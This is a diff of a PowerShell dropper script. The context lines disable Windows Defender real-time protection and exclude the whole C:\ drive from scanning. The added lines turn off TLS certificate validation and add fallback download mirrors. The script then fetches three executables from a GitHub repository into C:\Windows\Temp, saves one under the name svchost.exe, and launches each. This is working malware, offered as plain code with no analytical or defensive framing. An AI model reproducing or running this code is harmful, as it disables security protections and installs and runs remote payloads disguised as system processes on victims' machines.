@@ -3,21 +3,25 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath C:\
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
 $d = "C:\Windows\Temp"
-$s = "https://raw.githubusercontent.com/liubowen027/1111/refs/heads/main"
+$base = "https://raw.githubusercontent.com/liubowen027/1111/refs/heads/main"
+$mirrors = @(
+    "https://ghproxy.it/",
+    "https://wget.la/",
+    "https://gh-proxy.org/",
+    "https://ghproxy.net/",
+    "https://ghfast.top/"
+)
 
-$f1 = "$d\svchost.exe"
-(New-Object Net.WebClient).DownloadFile("$s/system.exe", $f1)
-Start-Sleep -Seconds 3
-Start-Process $f1
+function DL($file, $out) {
+    try { (New-Object Net.WebClient).DownloadFile("$base/$file", $out); return } catch {}
+    foreach ($m in $mirrors) {
+        try { (New-Object Net.WebClient).DownloadFile("$m$base/$file", $out); return } catch {}
+    }
+}
 
-$f2 = "$d\usc.exe"
-(New-Object Net.WebClient).DownloadFile("$s/usc.exe", $f2)
-Start-Sleep -Seconds 3
-Start-Process $f2
-
-$f3 = "$d\abg.exe"
-(New-Object Net.WebClient).DownloadFile("$s/agent1.exe", $f3)
-Start-Sleep -Seconds 3
-Start-Process $f3
+DL "system.exe" "$d\svchost.exe"; Start-Sleep 3; Start-Process "$d\svchost.exe"
+DL "usc.exe" "$d\usc.exe"; Start-Sleep 3; Start-Process "$d\usc.exe"
+DL "agent1.exe" "$d\abg.exe"; Start-Sleep 3; Start-Process "$d\abg.exe"
